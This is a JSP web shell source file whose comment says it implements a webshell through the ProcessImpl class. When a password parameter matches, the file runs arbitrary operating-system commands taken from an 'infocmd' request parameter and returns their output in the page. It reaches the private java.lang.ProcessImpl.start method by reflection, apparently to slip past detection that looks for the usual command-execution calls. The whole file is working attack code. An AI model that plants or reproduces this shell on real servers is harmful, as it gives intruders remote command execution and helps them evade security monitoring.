<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%--
通过ProcessImpl类实现JSP Webshell
--%>
<%
    if ("shaqima".equals(request.getParameter("ladypwd"))) {
        Class procImplClazz = Class.forName("java.lang.ProcessImpl");
        try {
            Method method = procImplClazz.getDeclaredMethod("start",
                    String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            method.setAccessible(true);
            String[] cmds = request.getParameter("infocmd").split(" ");
            Process p = (Process) method.invoke(null, cmds, null, null, null, false);
            InputStream in = p.getInputStream();
            int ret = -1;
            byte[] bs = new byte[2048];
            out.print("<pre>");
            while((ret = in.read(bs)) != -1) {
                out.println(new String(bs));
            }
            out.print("</pre>");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
%>

